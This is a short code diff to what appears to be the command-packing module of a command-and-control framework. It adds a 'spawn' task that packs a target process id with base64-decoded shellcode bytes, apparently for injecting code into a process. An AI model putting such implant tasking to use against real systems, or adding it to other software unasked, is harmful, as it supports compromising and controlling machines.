@@ -274,6 +274,17 @@ def pack_command_params(cmd_name, params):
         pk.add_string(params.get("application", ""))
         pk.add_string(params.get("arguments", ""))
 
+    elif cmd_name == "spawn":
+        import base64
+        pid_val = int(params.get("pid", 0))
+        pk.add_int32(pid_val)
+        sc_b64 = params.get("shellcode_data", "")
+        if sc_b64:
+            sc_raw = base64.b64decode(sc_b64)
+            pk.add_bytes(sc_raw)
+        else:
+            pk.add_bytes(b"")
+
     return pk.build()
 
 
